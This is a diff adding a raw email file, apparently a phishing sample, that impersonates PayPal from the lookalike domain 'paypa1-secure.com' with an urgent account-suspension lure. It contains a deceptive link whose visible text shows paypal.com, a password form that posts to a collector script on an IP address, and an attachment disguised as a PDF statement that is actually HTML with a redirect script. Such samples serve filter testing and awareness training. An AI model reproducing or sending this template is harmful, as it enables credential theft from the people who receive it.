@@ -1,0 +1,57 @@
+Return-Path: <bounce@mailer-cloud.example>
+Received: from mailer-cloud.example (unknown [203.0.113.45]) by mx.example.com
+Authentication-Results: mx.example.com; spf=softfail
+ smtp.mailfrom=mailer-cloud.example; dkim=none; dmarc=fail
+ header.from=paypa1-secure.com
+From: PayPal Security <service@paypa1-secure.com>
+Reply-To: support@helpdesk-mail.example
+To: alex@example.com
+Subject: Your account has been limited - action required
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============8669857305348323694=="
+
+--===============8669857305348323694==
+Content-Type: multipart/alternative;
+ boundary="===============6162665664565924095=="
+
+--===============6162665664565924095==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Dear customer,
+
+We detected unusual activity. Your account has been suspended.
+Please verify your account within 24 hours or it will be permanently locked.
+
+Sign in: http://paypa1-secure.com/login/verify?id=88213
+
+PayPal Security Team
+
+--===============6162665664565924095==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body>
+<p>Dear customer,</p>
+<p>We detected unusual activity. Your account has been <b>suspended</b>.
+Please <b>verify your account</b> within 24 hours or it will be permanently l=
+ocked.</p>
+<p><a href=3D"http://paypa1-secure.com/login/verify?id=3D88213">https://www.p=
+aypal.com/signin</a></p>
+<form action=3D"http://203.0.113.45/collect.php"><input name=3D"password" typ=
+e=3D"password"></form>
+<p>PayPal Security Team</p></body></html>
+
+--===============6162665664565924095==--
+
+--===============8669857305348323694==
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Account_Statement.pdf.html"
+MIME-Version: 1.0
+
+PGh0bWw+PHNjcmlwdD5sb2NhdGlvbj0naHR0cDovLzIwMy4wLjExMy40NS8nPC9zY3JpcHQ+PC9o
+dG1sPg==
+
+--===============8669857305348323694==--
